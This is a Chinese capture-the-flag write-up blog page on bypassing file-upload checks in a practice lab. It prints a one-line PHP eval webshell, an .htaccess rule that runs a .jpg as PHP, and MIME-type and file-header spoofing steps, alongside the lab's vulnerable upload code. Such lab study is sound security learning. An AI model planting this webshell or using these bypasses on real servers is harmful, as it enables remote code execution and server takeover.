@@ -1,0 +1,932 @@
+<!DOCTYPE html>
+<html lang="en-uk" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='File Upload: ggctf-upload 《学了一天 file-uploads之直接换到国光师傅的靶场.jpg》 主要是file-uploads 看上去还有很多的 open的issue'><title>File Upload: ggctf-upload</title>
+
+<link rel='canonical' href='https://ginkgo.org.cn/posts/file_upload_ggctf_upload/'>
+
+<link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='File Upload: ggctf-upload'>
+<meta property='og:description' content='File Upload: ggctf-upload 《学了一天 file-uploads之直接换到国光师傅的靶场.jpg》 主要是file-uploads 看上去还有很多的 open的issue'>
+<meta property='og:url' content='https://ginkgo.org.cn/posts/file_upload_ggctf_upload/'>
+<meta property='og:site_name' content='Under The Ginkgo'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='file_upload' /><meta property='article:tag' content='security' /><meta property='article:tag' content='server_side_vul' /><meta property='article:published_time' content='2022-04-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-05-01T13:05:57&#43;01:00'/>
+<meta name="twitter:title" content="File Upload: ggctf-upload">
+<meta name="twitter:description" content="File Upload: ggctf-upload 《学了一天 file-uploads之直接换到国光师傅的靶场.jpg》 主要是file-uploads 看上去还有很多的 open的issue">
+    <link rel="shortcut icon" href="/img/favicon.ico" />
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZKEXSTS2N4"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-ZKEXSTS2N4', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/Ginkgo_hu5438825b9b6d1014226d20d231e650c2_69187_300x0_resize_q75_box.JPG" width="300"
+                            height="237" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🧐</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Under The Ginkgo</a></h1>
+            <h2 class="site-description">BOYS FIGHT FOR YOUR LIBERTY</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/medic0803'
+                        target="_blank"
+                        title="A_GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='mailto:medicwrf@gmail.com'
+                        target="_blank"
+                        title="B_E-mail"
+                    >
+                        
+                        
+                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1647773061437" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2742" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><defs><style type="text/css"></style></defs><path d="M937.593333 257.073333A148.353333 148.353333 0 0 0 832 213.333333H384v-42.666666h85.333333a85.333333 85.333333 0 0 0 0-170.666667H362.666667a21.333333 21.333333 0 0 0-21.333334 21.333333v192H212.26A53.426667 53.426667 0 0 0 160 170.666667h-64a53.393333 53.393333 0 0 0-53.333333 53.333333v533.333333a53.393333 53.393333 0 0 0 53.333333 53.333334h64a53.426667 53.426667 0 0 0 52.26-42.666667H384v192a21.333333 21.333333 0 0 0 21.333333 21.333333h170.666667a21.333333 21.333333 0 0 0 21.333333-21.333333v-192h362.666667a21.333333 21.333333 0 0 0 21.333333-21.333333V362.666667a148.353333 148.353333 0 0 0-43.74-105.593334zM512 85.333333a42.713333 42.713333 0 0 1-42.666667 42.666667H384V42.666667h85.333333a42.713333 42.713333 0 0 1 42.666667 42.666666zM170.666667 757.333333a10.666667 10.666667 0 0 1-10.666667 10.666667h-64a10.666667 10.666667 0 0 1-10.666667-10.666667V224a10.666667 10.666667 0 0 1 10.666667-10.666667h64a10.666667 10.666667 0 0 1 10.666667 10.666667z m384 181.333334H426.666667v-170.666667h128z m384-213.333334H213.333333V256h128v149.333333a21.333333 21.333333 0 0 0 21.333334 21.333334h85.333333a21.333333 21.333333 0 0 0 0-42.666667h-64V256h448c58.813333 0 106.666667 47.853333 106.666667 106.666667z" fill="#bababa" p-id="2743"></path></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" >
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/file_upload_ggctf_upload/">File Upload: ggctf-upload</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Apr 27, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    8 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="file-upload-ggctf-upload">File Upload: ggctf-upload</h2>
+<p>《学了一天 file-uploads之直接换到国光师傅的<a class="link" href="https://github.com/sqlsec/upload-labs-docker"  target="_blank" rel="noopener"
+    >靶场</a>.jpg》 <!-- raw HTML omitted -->
+主要是file-uploads 看上去还有很多的 open的issue，我自己闯关的时候也碰到了很多问题，在docker里面很多环境内容改起来也不舒服，刚好看到国光师傅写的这个ggctf-upload，有配套的wp并且长得也好看就是了 <!-- raw HTML omitted --></p>
+<h3 id="js">JS</h3>
+<p>第一关是一个前端后缀名检查绕过 <!-- raw HTML omitted --></p>
+<h4 id="解法一-抓包修改白名单">解法一：抓包修改白名单</h4>
+<p>用Burp拦截之后增加php到whitelist中就好了（白名单再强能被改就是白给233） <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-04-27_22-35-03_screenshot.png" width="500px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>上传成功，用蚁剑连接一下试试（这里可以在网页源码或者Burp的返回请求中看到图片的链接，如果临时文件存放的名字被改了就用得上） <!-- raw HTML omitted --></p>
+<p>用到的一句话木马 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p><a class="link" href="https://www.edureka.co/community/66334/what-is-the-use-of-the-symbol-in-php"  target="_blank" rel="noopener"
+    >PHP中@的作用</a>，本质上就是可以忽略所有的错误信息 <!-- raw HTML omitted --></p>
+<h4 id="解法二-禁用js">解法二：禁用JS</h4>
+<p>利用浏览器的选项或者插件禁用JS之后，客户端的过滤就失效了 <!-- raw HTML omitted --></p>
+<h4 id="解法三-js-debug">解法三：JS debug</h4>
+<p>在定义白名单出打上断点，然后刷新一下，步过之后修改白名单的内容即可（chrome可以直接在边上的Scopes中改，firefox直接console定义一下即可） <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-04-27_23-14-22_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<h3 id="解析上传">解析上传</h3>
+<p>自本文完成，国光的wp并未更新第二题，但是类似的利用很多，本文主要是利用<a class="link" href="https://blog.csdn.net/mmzkyl/article/details/112138834"  target="_blank" rel="noopener"
+    >.htaccess</a>的特性来修改服务器对于文件的解析来实现绕过 <!-- raw HTML omitted --></p>
+<ul>
+<li>.htaccess的作用 <!-- raw HTML omitted -->
+.htaccess文件是Apache服务器下的一个配置文件，主要用于 <!-- raw HTML omitted -->相关目录<!-- raw HTML omitted --> 下的网页配置 <!-- raw HTML omitted -->
+其作用域为其所在目录与所有的子目录，但是如果子目录中的 <code>.htaccess</code> 会覆盖父目录的效果 <!-- raw HTML omitted --></li>
+</ul>
+<p>因此我们通过上传一个 <code>.htaccess</code> 文件来修改 <code>upload</code> 目录下对于文件的解析来实现绕过 <!-- raw HTML omitted --></p>
+<p>以此上传两个文件 <!-- raw HTML omitted --></p>
+<ul>
+<li>
+<p>.htaccess <!-- raw HTML omitted -->
+将 <code>trojan.jpg</code> 文件当作 <code>php</code> 来解析 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!-- .htaccess --&gt;
+</span></span><span class="line"><span class="cl">&lt;FilesMatch &#34;trojan.jpg&#34;&gt;
+</span></span><span class="line"><span class="cl">Sethandler application/x-httpd-php
+</span></span><span class="line"><span class="cl">&lt;/FilesMatch&gt;
+</span></span></code></pre></div></li>
+</ul>
+<p>以及含有一句话木马的 <code>trojan.jpg</code> <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>之后就可以用蚁剑测试连接成功（我这里发现测试连接性会报错，但是实际添加了连接是可以连接的） <!-- raw HTML omitted --></p>
+<p>感觉其实要是像upload-files一样把源码贴出来就好了233 <!-- raw HTML omitted --></p>
+<p>最后我们来一起看一下php源码，主要是利用了黑名单过滤所有的webshell <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$name</span><span class="p">)[</span><span class="s1">&#39;extension&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$blacklist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;php7&#34;</span><span class="p">,</span> <span class="s2">&#34;php5&#34;</span><span class="p">,</span> <span class="s2">&#34;php4&#34;</span><span class="p">,</span> <span class="s2">&#34;php3&#34;</span><span class="p">,</span> <span class="s2">&#34;phtml&#34;</span><span class="p">,</span> <span class="s2">&#34;pht&#34;</span><span class="p">,</span> <span class="s2">&#34;jsp&#34;</span><span class="p">,</span> <span class="s2">&#34;jspa&#34;</span><span class="p">,</span> <span class="s2">&#34;jspx&#34;</span><span class="p">,</span> <span class="s2">&#34;jsw&#34;</span><span class="p">,</span> <span class="s2">&#34;jsv&#34;</span><span class="p">,</span> <span class="s2">&#34;jspf&#34;</span><span class="p">,</span> <span class="s2">&#34;jtml&#34;</span><span class="p">,</span> <span class="s2">&#34;asp&#34;</span><span class="p">,</span> <span class="s2">&#34;aspx&#34;</span><span class="p">,</span> <span class="s2">&#34;asa&#34;</span><span class="p">,</span> <span class="s2">&#34;asax&#34;</span><span class="p">,</span> <span class="s2">&#34;ascx&#34;</span><span class="p">,</span> <span class="s2">&#34;ashx&#34;</span><span class="p">,</span> <span class="s2">&#34;asmx&#34;</span><span class="p">,</span> <span class="s2">&#34;cer&#34;</span><span class="p">,</span> <span class="s2">&#34;swf&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="nv">$blacklist</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;error();&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span></code></pre></div><dl>
+<dt>basename()</dt>
+<dd>basename(string $path, string $suffix = &ldquo;&rdquo;): string <!-- raw HTML omitted -->
+path: 文件路径 <!-- raw HTML omitted -->
+suffix: 文件后缀 <!-- raw HTML omitted -->
+return: 文件名（有/无后缀） <!-- raw HTML omitted --></dd>
+<dt>pathinfo</dt>
+<dd>pathinfo(string $path, int $flags = PATHINFO_ALL): array|string <!-- raw HTML omitted -->
+path: 文件路径 <!-- raw HTML omitted -->
+flags: 指定需要返回的内容{dirname, basename, extension, filename} <!-- raw HTML omitted -->
+return: 根据flags决定, 多个内容的话就会返回数组（默认全部） <!-- raw HTML omitted --></dd>
+</dl>
+<h3 id="mime-绕过">MIME 绕过</h3>
+<p>首先我们根据提示信息来认识一下 <code>MIME</code> <!-- raw HTML omitted --></p>
+<p>媒体类型（通常称为 Multipurpose Internet Mail Extensions 或 MIME 类型 ）是一种标准，用来表示文档、文件或字节流的性质和格式。 <!-- raw HTML omitted --></p>
+<p>MIME的组成结构非常简单；由类型与子类型两个字符串中间用 &lsquo;/&rsquo; 分隔而组成。不允许空格存在。 <!-- raw HTML omitted --></p>
+<ul>
+<li>type 表示可以被分多个子类的独立类别。 <!-- raw HTML omitted --></li>
+<li>subtype 表示细分后的每个类型 <!-- raw HTML omitted --></li>
+</ul>
+<p>通用的结构为： <!-- raw HTML omitted --></p>
+<p>type/subtype <!-- raw HTML omitted --></p>
+<p>MIME类型对大小写不敏感，但是传统写法都是小写。 <!-- raw HTML omitted --></p>
+<p>然后查看源码 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s2">&#34;image/jpeg&#34;</span><span class="p">,</span> <span class="s2">&#34;image/png&#34;</span><span class="p">,</span> <span class="s2">&#34;image/gif&#34;</span><span class="p">,</span> <span class="s2">&#34;image/jpg&#34;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;上传失败&#39;)&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>这里检查的方式是检查 <code>$_FILES['file']['type']</code> 的值，这里我们来学习一下PHP的 <code>superglobals</code>: <code>$_FILES</code>,以及其相关的用法 <!-- raw HTML omitted --></p>
+<dl>
+<dt>$_FILES</dt>
+<dd>PHP官网：&ldquo;An associative array of items uploaded to the current script via the HTTP POST method.&rdquo; <!-- raw HTML omitted -->
+即一个存放所有通过 <code>POST</code> 方法上传的文件信息的数组 <!-- raw HTML omitted --></dd>
+</dl>
+<p>然后我们来看看 <code>POST</code> 上传中所包含<a class="link" href="https://www.php.net/manual/en/features.file-upload.post-method.php"  target="_blank" rel="noopener"
+    >文件的信息</a> <!-- raw HTML omitted --></p>
+<dl>
+<dt>$_FILES[&lsquo;userfile&rsquo;][&rsquo;name&rsquo;]</dt>
+<dd>从客户端上传的文件的原始名字 <!-- raw HTML omitted --></dd>
+<dt>$_FILES[&lsquo;userfile&rsquo;][&rsquo;type&rsquo;]</dt>
+<dd>文件的<a class="link" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types"  target="_blank" rel="noopener"
+    >MIME types</a>， <!-- raw HTML omitted --></dd>
+<dt>$_FILES[&lsquo;userfile&rsquo;][&lsquo;size&rsquo;]</dt>
+<dd>文件的大小(bytes) <!-- raw HTML omitted --></dd>
+<dt>$_FILES[&lsquo;userfile&rsquo;][&rsquo;tmp_name&rsquo;]</dt>
+<dd>用于存储文件将要存放在server的临时名字 <!-- raw HTML omitted --></dd>
+<dt>$_FILES[&lsquo;userfile&rsquo;][&rsquo;error&rsquo;]</dt>
+<dd>上传失败的<a class="link" href="https://www.php.net/manual/en/features.file-upload.errors.php"  target="_blank" rel="noopener"
+    >错误信息</a> <!-- raw HTML omitted --></dd>
+<dt>$_FILES[&lsquo;userfile&rsquo;][&lsquo;full_path&rsquo;]</dt>
+<dd>浏览器提交的完整路径? PHP8.1.0支持 <!-- raw HTML omitted --></dd>
+</dl>
+<p>接着我们来看本次文件上传的HTTP请求 <!-- raw HTML omitted --></p>
+<p>是不是能发现我们刚刚提到过的 <code>$_FILES</code> 的信息？ <!-- raw HTML omitted -->
+userfile = &ldquo;file&rdquo; <!-- raw HTML omitted -->
+$_FILES[&lsquo;userfile&rsquo;][&rsquo;type&rsquo;] = &ldquo;text/php&rdquo; <!-- raw HTML omitted -->
+$_FILES[&lsquo;userfile&rsquo;][&rsquo;name&rsquo;] = &ldquo;trojan.php&rdquo; <!-- raw HTML omitted --></p>
+<p>因此我们通过抓包后修改 <code>MIME</code> 格式为白名单中的任意一个图片格式即可绕过 <!-- raw HTML omitted --></p>
+<p>蚁剑连接测试成功 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-04-29_11-54-24_screenshot.png" width="400px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<h3 id="文件头绕过">文件头绕过</h3>
+<p>题目提示给的信息已经很多全面了，每一个文件的开头都存放了响应的格式指示，因此我们的目标就是修改这个文件头来实现绕过 <!-- raw HTML omitted --></p>
+<p>接着我们结合源码来看，后台首先还是检测了上题的 <code>MIME</code> 类型，需要修改一下，接着校验了三个图片格式的文件头是否存在于文件内 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s2">&#34;image/jpeg&#34;</span><span class="p">,</span> <span class="s2">&#34;image/jpg&#34;</span><span class="p">,</span> <span class="s2">&#34;image/png&#34;</span><span class="p">,</span> <span class="s2">&#34;image/gif&#34;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nx">bin2hex</span><span class="p">(</span><span class="nv">$bin</span><span class="p">),</span> <span class="p">[</span><span class="s2">&#34;89504E47&#34;</span><span class="p">,</span> <span class="s2">&#34;FFD8FFE0&#34;</span><span class="p">,</span> <span class="s2">&#34;47494638&#34;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;error();&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>那我们只需要用Burp截取请求之后，修改MIME类型以及加上文件头即可 <!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted --> <!-- raw HTML omitted -->
+蚁剑连接成功 <!-- raw HTML omitted --></p>
